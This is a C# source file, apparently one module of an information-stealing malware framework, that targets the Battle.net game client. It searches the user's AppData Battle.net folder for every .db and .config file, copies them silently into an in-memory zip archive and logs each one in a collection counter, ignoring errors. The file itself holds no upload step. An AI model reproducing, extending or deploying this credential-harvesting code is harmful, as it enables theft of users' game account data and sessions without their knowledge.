using Helper.Data;
using System;
using System.IO;

namespace Targets.Games
{
	public class BattleNet : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Battle.net");
	    if (!Directory.Exists(path))
	      return;
	    string[] strArray = new string[2]{ "*.db", "*.config" };
	    Counter.CounterApplications counterApplications = new Counter.CounterApplications()
	    {
	      Name = nameof (BattleNet)
	    };
	    foreach (string searchPattern in strArray)
	    {
	      foreach (string file in Directory.GetFiles(path, searchPattern, SearchOption.AllDirectories))
	      {
	        try
	        {
	          FileInfo fileInfo = new FileInfo(file);
	          string entryPath = Path.Combine(Path.Combine(nameof (BattleNet), fileInfo.Directory?.Name == "Battle.net" ? "" : fileInfo.Directory?.Name), fileInfo.Name);
	          zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
	          counterApplications.Files.Add($"{fileInfo.FullName} => {entryPath}");
	        }
	        catch
	        {
	        }
	      }
	    }
	    if (counterApplications.Files.Count <= 0)
	      return;
	    counterApplications.Files.Add("BattleNet\\");
	    counter.Games.Add(counterApplications);
	  }
	}
}
